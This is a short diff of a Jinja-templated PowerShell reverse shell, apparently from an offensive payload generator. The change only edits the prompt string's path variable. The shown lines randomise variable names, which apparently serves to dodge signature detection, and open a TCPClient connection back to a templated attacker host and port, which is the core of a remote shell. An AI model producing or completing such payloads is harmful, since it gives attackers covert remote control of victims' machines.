@@ -1,6 +1,6 @@
 {% set variables = strings_random(10, 10) %}
 
-${{ variables[0] }} = "[38;5;196m>-[0m [38;5;250m${Env:PWD}[0m"
+${{ variables[0] }} = "[38;5;196m>-[0m [38;5;250m${PWD}[0m"
 ${{ variables[1] }} = "[38;5;196m->[0m"
 ${{ variables[2] }} = New-Object System.Net.Sockets.TCPClient(
     "{{ lhost }}", {{ lport }})
